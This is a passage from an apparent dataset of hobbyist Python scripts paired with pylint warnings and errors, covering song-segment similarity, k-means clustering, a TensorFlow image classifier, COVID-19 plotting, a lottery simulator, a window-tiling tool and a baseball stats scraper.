84       distances = distance.cdist(segsA[:,:12], segsB[:,:12], 'euclidean')
85       for i in range(len(distances)):
86           for j in range(len(distances[i])):
87               distances[i][j] = 10 * distances[i][j]
88       #Get the euclidean distance for the timbre vectors, adding it to the
89       #pitch distance
90       distances = distances + distance.cdist(segsA[:,12:24], segsB[:,12:24], 'euclidean')
91       #Get the rest of the distance calculations, adding them to the previous
92       #calculations.
93       for i in range(len(distances)):
94           for j in range(len(distances[i])):
95               distances[i][j] = distances[i][j] + abs(segsA[i][24] - segsB[j][24])
96               distances[i][j] = distances[i][j] + abs(segsA[i][25] - segsB[j][25]) + abs(segsA[i][26] - segsB[j][26]) * 100
97       i_point = 0
98       j_point = 0
99       #Use i_point and j_point for the indices in the 2D distances array
100       for i_point in range(len(distances)):
101           for j_point in range(len(distances[i])):
102               #Check to see if the distance between segment # i_point and
103               #segment # j_point is less than 45
104               if abs(distances[i_point][j_point]) <= thres:
105                   #Add to the adjacency lists if not already there
106                   if j_point not in adj_listA[i_point]:
107                       adj_listA[i_point].append(j_point)
108                   if i_point not in adj_listB[j_point]:
109                       adj_listB[j_point].append(i_point)
110               j_point = j_point + 1
111           i_point = i_point + 1
112           j_point = 0
113       #Get the count of the similarities in the adjacency lists
114       for i in adj_listA:
115           if len(i) > 0:
116               sim_countA = sim_countA + len(i);
117               sim_seg_countA = sim_seg_countA + 1
118       for i in adj_listB:
119           if len(i) > 0:
120               sim_countB = sim_countB + len(i);
121               sim_seg_countB = sim_seg_countB + 1
122   
123               #print i, ""\n""
124       print ""Num of segments with at least 1 match in song A: "", sim_seg_countA, "" out of"", len(segmentsA)
125       print ""Percentage of segments with at least 1 match in song A: "", (sim_seg_countA / float(len(segmentsA)) * 100), ""%""
126       print ""Num of similar tuples: "", sim_countA, "" out of "", len(segmentsA) *len(segmentsB)
127       print ""Percentage of possible tuples that are similar: "", sim_countA / float(len(segmentsA) * len(segmentsB)) * 100, ""%""
128       print ""Num of segments with at least 1 match in song B: "", sim_seg_countB, "" out of"", len(segmentsB)
129       print ""Percentage of segments with at least 1 match in song B: "", (sim_seg_countB / float(len(segmentsB)) * 100), ""%""
130       #Get the number of bins.  Calculated by taking the max range and dividing by 50
131       bins = int(np.amax(distances)) / thres
132       #Make the histogram with titles and axis labels.  Plot the line x=thres for visual comparison.
133       plt.hist(distances.ravel(), bins = bins)
134       plt.title('Distances between Tuples of Segments' + nameA + nameB)
135       plt.xlabel('Distances')
136       plt.ylabel('Number of occurrences')
137       plt.axvline(thres, color = 'r', linestyle = 'dashed')
138       #Make each tick on the x-axis correspond to the end of a bin.
139       plt.xticks(range(0, int(np.amax(distances) + 2 * thres), thres))
140       #Make each tick on the y-axis correspond to each 25000th number up to the number of possible tuple combos / 2.
141       plt.yticks(range(0, (len(segmentsA) * len(segmentsB))/2 + 25000, 25000))
142       plt.gcf().savefig('Histograms/' + nameA + 'and' + nameB + '_histogram.png')
143       plt.close()
144   
145   '''
146   Method that runs the comparison on every pair of .mp3 files in a directory
147   '''
148   def dir_comp(dir):
149       files = get_mp3_files(dir)
150       count = 0
151       total = sum(range(len(files) + 1))
152       for f1 in files:
153           for f2 in files:
154               nameA = os.path.basename(os.path.splitext(f1)[0])
155               nameB = os.path.basename(os.path.splitext(f2)[0])
156               if not os.path.isfile('Histograms/' + nameA + 'and' + nameB + '_histogram.png') and not os.path.isfile('Histograms/' + nameB + 'and' + nameA + '_histogram.png'):
157                   two_song_comp(f1, f2)
158                   print ""Comparison completed!""
159                   count = count + 1
160                   print count, "" out of "", total
161       print ""Finished.""
","124 - error: syntax-error
"
"1   """"""
2   seg_kmeans.py
3   
4   This code performs K-Means clustering on a dataset passed in as a pickled
5   NumPy array.
6   
7   There is a function (seg_kmeans) that performs K-Means on
8   the dataset not using another class's stuff.  There is another function
9   (KMeans) that performs K-Means on the dataset by using Scikit-Learn's
10   K-Means class inside of the cluster package.
11   Both functions have the follwoing parameters:
12   
13       1. filename: the file that contains the dataset (must be a pickled array)
14       2. clusters: the number of clusters to generate
15       3. iter: the max number of iterations to use
16   
17   This also saves the results to an output in the Results folder.
18   
19   Author: Chris Smith
20   
21   Version: 4.19.2015
22   """"""
23   import matplotlib
24   matplotlib.use(""Agg"")
25   import numpy as np
26   from numpy import random
27   import scipy.spatial.distance as distance
28   from sklearn import metrics
29   from sklearn import cluster
30   import matplotlib.pyplot as plt
31   import time
32   
33   '''
34   Figures out which cluster center that the segment x is closest to.
35   '''
36   def classify(x, size, centroids):
37       list = np.zeros(size)
38       for i in range(size):
39           list[i] = np.sqrt(np.sum((centroids[i] - x) ** 2))
40       return np.argmin(list)
41   '''
42   Figures out the cluster member counts and the max distances from the centers in each cluster.
43   Also, histograms are generated.
44   '''
45   def score(centers, centroids):
46       counts = np.zeros(len(centers))
47       maxes = np.zeros(len(centers))
48       index = 0
49       np.asarray(centers)
50       for i in range(len(centers)):
51           counts[index] = len(centers[index])
52           index += 1
53       for i in range(len(centers)):
54           maxes[i] = distance.cdist(centers[i], np.asarray(centroids[i]).reshape((1,27)), 'euclidean').max()
55       if np.amax(counts)/50 >= 5:
56           bins = np.amax(counts) / 50
57       else:
58           bins = 5
59       plt.hist(counts.ravel(), bins = bins)
60       plt.title('Number of members per cluster')
61       plt.xlabel('Number of members')
62       plt.ylabel('Number of occurrences')
63       ticks = range(0, int(np.amax(counts)))
64       plt.xticks(ticks[0::50])
65       plt.gcf().savefig('Results/countHistogram.png')
66       plt.close()
67       if np.amax(maxes)/50 >= 5:
68           bins = np.amax(maxes) / 50
69       else:
70           bins = 5
71    
72       plt.hist(maxes.ravel(), bins = bins)
73       plt.title('Max distance in cluster')
74       plt.xlabel('Max distances')
75       plt.ylabel('Number of occurrences')
76       ticks = range(0, int(np.amax(maxes)))
77       plt.xticks(ticks[0::50])
78       plt.gcf().savefig('Results/maxdistHistogram.png')
79       plt.close()
80   
81   
82       print ""Counts of each cluster:""
83       print counts
84       print ""------------------------------""
85       print ""The max distance from each center to a cluster member:""
86       print maxes
87       print ""------------------------------""
88   
89   '''
90   Performs K-Means clustering on a dataset of music segments without using a pre-made function.
91   Saves the results to a .npy file in the Results folder.
92   '''
93   def seg_kmeans(filename, clusters, iter):
94       #Initialize everything
95       data = np.load(filename)
96       #Use the first 1 million segments
97       data.resize(1000000,27)
98       centroids = np.empty((clusters, 27))
99       copyroids = np.empty((clusters, 27))
100       for i in range(0, clusters):
101           sample = random.randint(0, len(data))
102           centroids[i] = data[sample]
103       #Start the algorithm
104       stop = False
105       attempt = 1
106       numlist = []
107       while not stop and attempt <= iter:
108           #Initialize the lists
109           numlist = []
110           for i in range(clusters):
111               numlist.append([])
112           print ""Attempt Number: %d"" % attempt
113           #Classify stuff
114           for row in range(len(data)):
115               closest = classify(data[row], clusters, centroids)
116               numlist[closest].append(data[row])
117               if row % 10000 == 0:
118                   print row
119           #Redo the centroids
120           copyroids = centroids.copy()
121           for i in range(clusters):
122               if len(numlist[i]) > 0:
123                   centroids[i].put(range(27), np.average(numlist[i], axis=0).astype(np.int32))
124           attempt += 1
125           if np.any(centroids-copyroids) == 0:
126               stop = True
127       score(numlist, centroids)
128       np.save(""Results/clusterdata.npy"", numlist)
129   
130   '''
131   Performs the K-Means clustering algorithm that Scikit-Learn's cluster package provides.
132   Saves the output into a file called clusterdata.npy.  This file is located in the Results folder.
133   '''
134   def KMeans(filename, clusters, iter):
135       data = np.load(filename)
136       data.resize(100000,27)
137       print ""Loaded data""
138       t0 = time.time()
139       estimator = cluster.KMeans(n_clusters=clusters, n_init = 5, max_iter=iter, verbose=1, n_jobs=5)
140       estimator.fit(data)
141       print('%.2fs    %i'
142             % ((time.time() - t0), estimator.inertia_))
143       saveddata = [estimator.cluster_centers_, estimator.labels_, estimator.inertia_]
144       np.save(""Results/clusterdata.npy"", saveddata)
","82 - error: syntax-error
"
"1   """"""
2   timing.py
3   
4   Usage: In the functions following this, the parameters are described as follows:
5   
6   filename: the file that contains segment data
7   
8   This file must have been a NumPy array of segment data that was saved.  It is loaded through NumPy's load function.
9   
10   Each segment array is in the following format:
11   
12   [12 values for segment pitch, 12 values for segment timbre, 1 value for loudness
13   max, 1 value for loudness start, and 1 value for the segment duration]
14   
15   Author: Chris Smith
16   
17   Date: 04.11.2015
18   """"""
19   
20   import time
21   import scipy.spatial.distance as distance
22   import numpy as np
23   
24   '''
25   Method that takes a file of segment data (a 2D NumPy array), and compares the first 850 segments to 1000, 10000, 100000, and
26   1000000 segments.  The results are ignored, as this function times the comparisons.
27   '''
28   def comp_time(filename):
29       seg_array = np.load(filename)
30       song = seg_array[:850:].copy()
31       t1 = time.time()
32       distance.cdist(song, seg_array[:1000:],'euclidean')
33       t2 = time.time()
34       distance.cdist(song, seg_array[:10000:],'euclidean')
35       t3 = time.time()
36       distance.cdist(song, seg_array[:100000:],'euclidean')
37       t4 = time.time()
38       distance.cdist(song, seg_array[:1000000:],'euclidean')
39       t5 = time.time()
40       print ""Time for comparisons between a song and 1000 segments: "" + str(t2-t1)
41       print ""Time for comparisons between a song and 10000 segments: "" + str(t3-t2)
42       print ""Time for comparisons between a song and 100000 segments: "" + str(t4-t3)
43       print ""Time for comparisons between a song and 1000000 segments: "" + str(t5-t4)
","40 - error: syntax-error
"
"1   
2   # coding: utf-8
3   
4   # In[2]:
5   
6   import numpy as np
7   import tensorflow as tf
8   import requests
9   import urllib
10   from PIL import Image 
11   import os
12   import matplotlib.pyplot as plt
13   import cv2 as cv2
14   
15   get_ipython().magic('matplotlib inline')
16   
17   
18   # In[3]:
19   
20   os.chdir(""C:\\Users\\USER\\python studyspace\\Deep learning\\Project"")
21   pic = Image.open(""cat_test.jpg"")
22   new_image = pic.resize((32,32))
23   test1 = np.array(new_image)
24   test1 = test1.reshape(1,32,32,3)
25   print(test1.shape)
26   
27   
28   # In[5]:
29   
30   plt.imshow(pic)
31   
32   
33   # In[6]:
34   
35   sess = tf.Session()
36   
37   saver = tf.train.import_meta_graph('save2.ckpt.meta')
38   
39   saver.restore(sess, tf.train.latest_checkpoint('./'))
40       
41   graph = tf.get_default_graph()
42   
43   y_pred = graph.get_tensor_by_name(""train_pred:0"")
44   
45   x = graph.get_tensor_by_name(""train_dataset:0"")
46   y_true = graph.get_tensor_by_name(""train_label:0"")
47   
48   y_test_images = np.zeros((1,2))
49   
50   feed_dict_testing = {x: test1, y_true: y_test_images}
51   
52   result=sess.run(y_pred, feed_dict=feed_dict_testing)
53   
54   
55   # In[7]:
56   
57   print(result)
58   
59   
60   # In[ ]:
61   
62   
63   
","15 - error: undefined-variable
24 - error: too-many-function-args
8 - warning: unused-import
9 - warning: unused-import
13 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   Created on Sun May 10 23:34:29 2020
4   
5   @author: HP USER
6   """"""
7   
8   
9   import urllib.request, urllib.error, urllib.parse
10   import json
11   import sqlite3
12   import pandas as pd
13   from datetime import datetime
14   import matplotlib.pyplot as plt
15   import matplotlib
16   import numpy as np
17   
18   #retrieve json file and decode it
19   jsonFile = urllib.request.urlopen('https://api.covid19india.org/data.json').read()
20   data = json.loads(jsonFile)
21   
22   conn = sqlite3.connect('Covid19Data.sqlite')
23   cur = conn.cursor()
24   
25   #create a table in database if the table does not exists
26   cur.executescript('''
27               CREATE TABLE IF NOT EXISTS dailyCases(
28                   dailyConfirmed INTEGER NOT NULL, 
29                   dailyDeceased INTEGER NOT NULL, 
30                   dailyRecovered INTEGER NOT NULL,
31                   date TEXT NOT NULL UNIQUE,
32                   totalConfirmed INTEGER NOT NULL,
33                   totalDeceased INTEGER NOT NULL,
34                   totalRecovered INTEGER NOT NULL
35               );''')
36   
37   #%%
38   
39   #update the data in database for each date
40   for daily in data['cases_time_series']:
41       dailyData = list(daily.values())
42       cur.execute('''SELECT * FROM dailyCases WHERE date=?''', (dailyData[3], ))
43       result = cur.fetchone()
44       if result is None:
45           cur.execute('''
46                   INSERT INTO dailyCases (dailyConfirmed, dailyDeceased, dailyRecovered, date,
47                   totalConfirmed, totalDeceased, totalRecovered) VALUES ( ?, ?, ?, ?, ?, ?, ?)''', 
48                   (int(dailyData[0]), int(dailyData[1]), int(dailyData[2]), dailyData[3],
49                    int(dailyData[4]), int(dailyData[5]), int(dailyData[6])))
50       elif result[4] < int(dailyData[4]):
51           cur.execute('''
52                       UPDATE dailyCases
53                       SET totalConfirmed=?
54                       WHERE date=?''',
55                       (int(dailyData[4]), dailyData[3]))
56       conn.commit()
57   
58   
59   #%%
60   total = pd.read_sql('SELECT * FROM dailyCases', conn)
61   
62   #convert date to python datetime type object
63   def fun(x):
64       return datetime.strptime(x+str((datetime.today().year)), '%d %B %Y')
65   total['date'] = total['date'].apply(fun)
66   
67   #plot figure for total cases for each day
68   fig = plt.figure()
69   
70   plt.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
71   plt.plot(total['date'], total['totalConfirmed'], '-o', ms=1)
72   plt.title('Total cases in India for each day')
73   plt.xlabel('Dates', fontsize=12)
74   plt.ylabel('Total cases', labelpad=0.1, fontsize=12)
75   
76   def slide(event):
77       date = int(event.xdata)
78       print(event.xdata)
79       dateIndex = date - dateLoc[0]+2
80       date = total['date'].iloc[dateIndex]
81       strDate = date.strftime('%d %b')
82       #text for displaying the total cases for each day
83       str = 'Total cases on {} were {}'.format(strDate, total['totalConfirmed'].iloc[dateIndex])
84       plt.cla()
85       plt.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
86       plt.plot(total['date'], total['totalConfirmed'], '-o', ms=1)
87       plt.text(x=dateLoc[0], y=50000, s=str)
88       plt.title('Total cases in India for each day')
89       plt.xlabel('Dates', fontsize=12)
90       plt.ylabel('Total cases', labelpad=0.1, fontsize=12)
91       plt.draw()
92   
93   dateLoc = (plt.gca().xaxis.get_majorticklocs())
94   dateLoc = dateLoc.astype(np.int64)
95   fig.canvas.mpl_connect('button_press_event', slide)
96   
97   #plot the figure for new cases reported for each day
98   fig2 = plt.figure()
99   fig2.set_figheight(9)
100   fig2.set_figwidth(16)
101   fig2.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
102   plt.bar(total['date'], total['dailyConfirmed'], width=0.8, alpha=0.8)
103   plt.plot(total['date'], total['dailyConfirmed'], c='red', alpha=0.8)
104   plt.title('New cases reported in India for each day')
105   plt.xlabel('Dates', fontsize=12)
106   plt.ylabel('New cases reported', labelpad=10, fontsize=12)
107   
108   def slide2(event):
109       date = int(round(event.xdata))
110       print(event.xdata)
111       dateIndex = date - dateLoc[0]+2
112       date = total['date'].iloc[dateIndex]
113       strDate = date.strftime('%d %b')
114   #    print(plt.gcf().texts())
115       str = 'Total cases reported on {} were {}'.format(strDate, total['dailyConfirmed'].iloc[dateIndex])
116       plt.cla()
117       plt.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
118       plt.bar(total['date'], total['dailyConfirmed'], alpha=0.8)
119       plt.plot(total['date'], total['dailyConfirmed'], c='red', alpha=0.8)
120       plt.annotate(xy=(event.xdata, total['dailyConfirmed'].iloc[dateIndex]),
121                        xytext=(dateLoc[0], 4000), s=str,
122                        arrowprops={'arrowstyle':'->'})
123       plt.title('New cases reported in India for each day')
124       plt.xlabel('Dates', fontsize=12)
125       plt.ylabel('New cases reported', fontsize=12, labelpad=10)
126       plt.draw()
127   
128   fig2.canvas.mpl_connect('button_press_event', slide2)
129   
130   plt.show()
131   conn.close()
","19 - refactor: consider-using-with
83 - warning: redefined-builtin
115 - warning: redefined-builtin
"
"1   # IPython log file
2   
3   import json
4   path = 'ch02/usagov_bitly_data2012-03-16-1331923249.txt' 
5   records = [json.loads(line) for line in open(path)]
6   import json
7   path = 'ch2/usagov_bitly_data2012-03-16-1331923249.txt' 
8   records = [json.loads(line) for line in open(path)]
9   import json
10   path = 'ch2/usagov_bitly_data2012-11-13-1352840290.txt'
11   records = [json.loads(line) for line in open(path)]
12   time_zones = [rec['tz'] for rec in records if 'tz' in rec]
13   get_ipython().magic(u'logstart')
14   ip_info = get_ipython().getoutput(u'ifconfig eth0 | grep ""inet ""')
15   ip_info[0].strip()
16   ip_info = get_ipython().getoutput(u'ifconfig en0 | grep ""inet ""')
17   ip_info[0].strip()
18   ip_info = get_ipython().getoutput(u'ifconfig en1 | grep ""inet ""')
19   ip_info[0].strip()
20   pdc
21   get_ipython().magic(u'debug')
22   def f(x, y, z=1):
23       tmp = x + y
24       return tmp / z
25   get_ipython().magic(u'debug (f, 1, 2, z = 3)')
26   get_ipython().magic(u'debug (f, 1, 2, z = 3)')
27   get_ipython().magic(u'debug (f, 1, 2, z = 3)')
28   def set_trace():
29       from IPython.core.debugger import Pdb
30       Pdb(color_scheme='Linux').set_trace(sys._getframe().f_back)
31       
32   def debug(f, *args, **kwargs):
33       from IPython.core.debugger import Pdb
34       pdb = Pdb(color_scheme='Linux')
35       return pdb.runcall(f, *args, **kwargs)
36   debug (f, 1, 2, z = 3)
37   set_trace()
38   class Message:
39       def __init__(self, msg):
40           self.msg = msg
41   class Message:
42       def __init__(self, msg):
43           self.msg = msg
44       def __repr__(self):
45           return 'Message: %s' % self.msg
46   x = Message('I have a secret')
47   x
","5 - refactor: consider-using-with
5 - warning: unspecified-encoding
6 - warning: reimported
8 - refactor: consider-using-with
8 - warning: unspecified-encoding
9 - warning: reimported
11 - refactor: consider-using-with
11 - warning: unspecified-encoding
13 - error: undefined-variable
13 - warning: redundant-u-string-prefix
14 - error: undefined-variable
14 - warning: redundant-u-string-prefix
16 - error: undefined-variable
16 - warning: redundant-u-string-prefix
18 - error: undefined-variable
18 - warning: redundant-u-string-prefix
20 - warning: pointless-statement
20 - error: undefined-variable
21 - error: undefined-variable
21 - warning: redundant-u-string-prefix
22 - warning: redefined-outer-name
25 - error: undefined-variable
25 - warning: redundant-u-string-prefix
26 - error: undefined-variable
26 - warning: redundant-u-string-prefix
27 - error: undefined-variable
27 - warning: redundant-u-string-prefix
30 - warning: protected-access
30 - error: undefined-variable
32 - warning: redefined-outer-name
38 - refactor: too-few-public-methods
41 - error: function-redefined
41 - refactor: too-few-public-methods
47 - warning: pointless-statement
"
"1   import random
2   
3   def lottery_sim(my_picks, num_tickets):
4       ticket = 1
5       winners = {3:0,4:0,5:0,6:0}
6       for i in range(num_tickets):
7           ticket+=1
8           drawing = random.sample(range(1, 53), 6)
9           correct = 0
10           for i in my_picks:
11               if i in drawing:
12                   correct+=1
13           if correct == 3:
14               winners[3]+=1
15   
16           elif correct == 4:
17               winners[4]+=1
18   
19           elif correct == 5:
20               winners[5]+=1
21               
22           elif correct == 6:
23               winners[6]+=1
24           
25       return winners
26   
27   lottery_sim([17,3,44,22,15,37], 100000)","Clean Code: No Issues Detected
"
"1   #!/usr/bin/python3
2   
3   import argparse
4   import subprocess
5   import re
6   
7   
8   HEIGHT_OFFSET = 60
9   
10   class Rectangle:
11       def __init__(self, x, y, w, h):
12           self.x = int(x) # origin x
13           self.y = int(y) # origin y
14           self.w = int(w) # width
15           self.h = int(h) # height
16   
17       def __str__(self):
18           return str(self.x) + ',' + str(self.y) + ',' \
19                  + str(self.w) + ',' + str(self.h)
20   
21       def __repr__(self):
22           return ""position: ("" + str(self.x) + \
23                  "","" + str(self.y) + ')'\
24                  "", size: "" + str(self.w) + \
25                  "","" + str(self.h) + ')'
26   
27   
28   # example ['1366x768+1024+373', '1024x768+0+0']
29   def get_displays():
30       out = str(execute('xrandr'))
31   
32       # remove occurrences of 'primary' substring
33       out = out.replace(""primary "", """")
34   
35       # we won't match displays that are disabled (no resolution)
36       out = out.replace(""connected ("", """")
37   
38       start_flag = "" connected ""
39       end_flag = "" (""
40       resolutions = []
41       for m in re.finditer(start_flag, out):
42           # start substring in the end of the start_flag
43           start = m.end()
44           # end substring before the end_flag
45           end = start + out[start:].find(end_flag)
46   
47           resolutions.append(out[start:end])
48   
49       displays = []
50       for r in resolutions:
51           width = r.split('x')[0]
52           height, x, y = r.split('x')[1].split('+')
53           displays.append(Rectangle(x, y, width, int(height)-HEIGHT_OFFSET))
54   
55       return displays
56   
57   
58   def parse_arguments():
59       parser = argparse.ArgumentParser(description='Tile tool')
60       parser.add_argument('-t', '--tile', dest='tile',
61                           choices=['left', 'right', 'top', 'bottom'],
62                           help='tile relatively to display')
63       parser.add_argument('-w', '--tile-window', dest='tile_w',
64                           choices=['left', 'right', 'top', 'bottom'],
65                           help='tile relatively to window itself')
66       parser.add_argument('-s', '--switch-display', dest='switch_display',
67                           action='store_true',
68                           help='move window to next display')
69       parser.add_argument('-c', '--change-to-display', dest='display',
70                           type=int, help='move window to specified display')
71       parser.add_argument('-m', '--maximize', dest='maximize',
72                           action='store_true', help='maximize window')
73       return parser.parse_args()
74   
75   
76   def execute(cmd):
77       print('$ ' + cmd)
78       return subprocess.check_output(['bash', '-c', cmd])
79   
80   
81   def get_active_window():
82       cmd = 'xdotool getactivewindow getwindowgeometry'
83       flag_pos_start = ""Position: ""
84       flag_pos_end = "" (screen:""
85       flag_geom_start = ""Geometry: ""
86       flag_geom_end = ""\\n""
87   
88       r = str(execute(cmd))
89       
90       str_pos = r[r.find(flag_pos_start) + len(flag_pos_start) \
91                 : r.find(flag_pos_end)]
92       str_geom = r[r.find(flag_geom_start) + len(flag_geom_start) \
93                  : r.rfind(flag_geom_end)]
94   
95       pos = str_pos.split(',')
96       geom = str_geom.split('x')
97   
98       return Rectangle(pos[0], pos[1], geom[0], geom[1])
99   
100   
101   def window_is_in_display(w, d):
102      return (d.x <= w.x <= d.x+d.w) and (d.y <= w.y <= d.y+d.h)
103   
104   
105   def get_display(displays, active):
106       w = get_active_window()
107       for d in displays:
108           if window_is_in_display(w, d):
109               if active:
110                   return d
111           else:
112               if not active:
113                   return d
114   
115   
116   def get_active_display(displays):
117       return get_display(displays, True)
118   
119   
120   def get_inactive_display(displays):
121       return get_display(displays, False)
122   
123   
124   def set_window(x, y, w, h):
125       cmd_header = 'wmctrl -r "":ACTIVE:"" -e 0,'
126   
127       cmd = cmd_header + str(x) + ',' + str(y) + ',' + str(w) + ',' + str(h)
128       execute(cmd)
129   
130   
131   def tile(direction, basis, display):
132       x = basis.x
133       y = basis.y
134       w = basis.w
135       h = basis.h
136   
137       if direction == 'left':
138           w = int(display.w/2)
139           x = display.x
140       elif direction == 'right':
141           w = int(display.w/2)
142           x = display.x + w
143       elif direction == 'top':
144           h = int(display.h/2)
145           y = display.y
146       elif direction == 'bottom':
147           h = int(display.h/2)
148           y = display.y + h
149   
150       set_window(x, y, w, h)
151   
152   
153   def main():
154       args = parse_arguments()
155       displays = get_displays()
156   
157       if args.tile:
158           display = get_active_display(displays)
159           tile(args.tile, display, display)
160   
161       if args.tile_w:
162           display = get_active_display(displays)
163           window = get_active_window()
164           # the get is 2 pixels more than the real value
165           window.x -= 2
166           tile(args.tile_w, window, display)
167   
168       if args.display is not None:
169           d = displays[args.display]
170           set_window(d.x, d.y, d.w, d.h)
171   
172       if args.switch_display:
173           d = get_inactive_display(displays)
174           set_window(d.x, d.y, d.w, d.h)
175   
176       if args.maximize:
177           d = get_active_display(displays)
178           set_window(d.x, d.y, d.w, d.h)
179   
180   
181   if __name__ == ""__main__"":
182       main()
","102 - warning: bad-indentation
105 - refactor: inconsistent-return-statements
"
"1   import requests
2   import sqlite3
3   from sqlite3 import Error
4   from bs4 import BeautifulSoup
5   
6   # Create the Cumulative database
7   CTeamStats = sqlite3.connect('CumulativeTeamStats.db')
8   
9   # This vector will be used to collect every team from 2012 to 2019
10   yearList = ['2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019']
11   
12   #Function to create the tables from 2012-2019
13   def cumulative_team_stats_table():
14       #cts -> cumulative team stats
15       cts = CTeamStats.cursor() 
16       table_values = '(Team_Name TEXT, Wins INTEGER, Runs INTEGER, Run_Differential INTEGER, WAR INTEGER, WPA INTEGER, Dollars REAL, Batter TEXT, AVG REAL, OBP REAL, SLG REAL, OPS REAL, wOBA REAL, wRCplus REAL, BBperc TEXT, Kperc TEXT, Spd REAL, Def REAL, BWAR REAL, BWPA REAL, BDollars TEXT, Pitcher TEXT, ERA REAL, ERAminus REAL, WHIP REAL, FIPx REAL, FIPxminus REAL, Kper9 REAL, Kper9plus REAL, HRper9 REAL, GBperc REAL, PWAR REAL, PWPA REAL, PDollars TEXT)'
17       #concatenate the string
18       cts.execute('CREATE TABLE IF NOT EXISTS Cumulative_Team_Stats' + table_values)
19       cts.close()
20   
21   #Fucntion used to enter the data of a team into the cts database
22   def data_entry(year, team_name, wins, runs, rd, war, wpa, dollar, batter, avg, obp, slg, ops, woba, wrc, bb, k, spd, defense, bwar, bwpa, bdollar, pitcher, era, eramin, whip, fipx, fipxmin, kper9, kper9plus, hrper9, gbperc, pwar, pwpa, pdollar):
23       cts = CTeamStats.cursor()
24       insertStatement = ""INSERT INTO Cumulative_Team_Stats (Team_Name, Wins, Runs, Run_Differential, WAR, WPA, Dollars, Batter, AVG, OBP, SLG, OPS, wOBA, wRCplus, BBperc, Kperc, Spd, Def, BWAR, BWPA, BDollars, Pitcher, ERA, ERAminus, WHIP, FIPx, FIPxminus, Kper9, Kper9plus, HRper9, GBperc, PWAR, PWPA, PDollars) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""
25       statTuple = (year + team_name, wins, runs, rd, war, wpa, dollar, batter, avg, obp, slg, ops, woba, wrc, bb, k, spd, defense, bwar, bwpa, bdollar, pitcher, era, eramin, whip, fipx, fipxmin, kper9, kper9plus, hrper9, gbperc, pwar, pwpa, pdollar)
26       cts.execute(insertStatement, statTuple)
27       CTeamStats.commit()
28       cts.close()
29   
30   #Function used to scrape fangraphs to get all of the desired team statistics
31   def web_scrape(teamList, year):
32       #adds all the pitcher stats from the teams
33       source = requests.get('https://www.fangraphs.com/leaders.aspx?pos=all&stats=pit&lg=all&qual=0&type=c,6,117,62,119,36,301,40,48,63,60,4,59,32,17,42&season=' + year + '&month=0&season1=' + year + '&ind=0&team=0,ts&rost=0&age=0&filter=&players=0&startdate=2019-01-01&enddate=2019-12-31&sort=1,a').text
34       soup = BeautifulSoup(source, ""html.parser"")
35       #use the identifier class to scrape the right table
36       table = soup.find('table', class_ = 'rgMasterTable')
37       table_rows = table.find_all('tr')
38       #Scrape all the data from the table
39       for tr in table_rows:
40           td = tr.find_all('td')
41           row = [i.text for i in td]
42           del row[:1]
43           #Simple conditional checks to make sure all the data looks the same
44           if len(row) != 0:
45               row[8] = row[8][:-1]
46               if row[10] == '($1.9)':
47                   row = '$1.9'
48               row[10] = row[10][1:]
49               teamList.append(row)
50       #adds all the batter stats to the teams
51       source = requests.get('https://www.fangraphs.com/leaders.aspx?pos=all&stats=bat&lg=all&qual=0&type=c,12,34,35,23,37,38,50,61,199,58,62,59,60,13,39&season=' + year + '&month=0&season1=' + year + '&ind=0&team=0,ts&rost=0&age=0&filter=&players=0&startdate=2019-01-01&enddate=2019-12-31&sort=1,a').text
52       soup = BeautifulSoup(source, ""html.parser"")
53       table = soup.find('table', class_ = 'rgMasterTable')
54       table_rows = table.find_all('tr')
55       #Scrape all the data from the table
56       for tr in table_rows:
57           td = tr.find_all('td')
58           row = [i.text for i in td]
59           del row[:2]
60           if len(row) != 0:
61               row[1] = row[1][:-1]
62               row[2] = row[2][:-1]
63               if row[11] == '($20.6)':
64                   row[11] = '$20.6'
65               if row[11] == '($19.0)':
66                   row[11] = '$19.0'
67               row[11] = row[11][1:]
68               teamList.append(row)
69           #Check to make the correct data is being added
70   
71   #Main Program
72   def main(): 
73       cumulative_team_stats_table()
74       #for every year in the vector yearList
75       for i in range(len(yearList)):
76           teamList = []
77           #Scrape the table for the entire year
78           web_scrape(teamList, yearList[i])
79           #Enter the data for all 30 major league teams
80           for j in range(30):
81               data_entry(yearList[i], teamList[j][0], teamList[j][11], int(teamList[j][13]), int(teamList[j+30][13]) - int(teamList[j][14]), round(float(teamList[j][12]) + float(teamList[j+30][9]), 3), round(float(teamList[j][9]) + float(teamList[j+30][10]), 3), round(float(teamList[j][10]) + float(teamList[j+30][11]), 3), '-', float(teamList[j+30][3]), float(teamList[j+30][4]), float(teamList[j+30][5]), float(teamList[j+30][14]), float(teamList[j+30][6]), int(teamList[j+30][7]), float(teamList[j+30][1]), float(teamList[j+30][2]), float(teamList[j+30][12]), float(teamList[j+30][8]), float(teamList[j+30][9]), float(teamList[j+30][10]), float(teamList[j+30][11]), '-', float(teamList[j][1]), int(teamList[j][2]), float(teamList[j][15]), float(teamList[j][3]), float(teamList[j][4]), float(teamList[j][5]), float(teamList[j][6]), float(teamList[j][7]), float(teamList[j][8]), float(teamList[j][12]), float(teamList[j][9]), float(teamList[j][10]))
82   
83   if __name__ == ""__main__"":
84       main()
","22 - refactor: too-many-arguments
22 - refactor: too-many-positional-arguments
22 - refactor: too-many-locals
33 - warning: missing-timeout
51 - warning: missing-timeout
3 - warning: unused-import
"
"1   import requests
2   import sqlite3
3   from sqlite3 import Error
4   from bs4 import BeautifulSoup
5   
6   # Create the batter pool database
7   BatterPool = sqlite3.connect('TeamBatterPool.db')
8   
9   positionList = ['c', '1b', '2b', 'ss', '3b', 'rf', 'cf', 'lf', 'dh']
10   yearList = ['2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019']
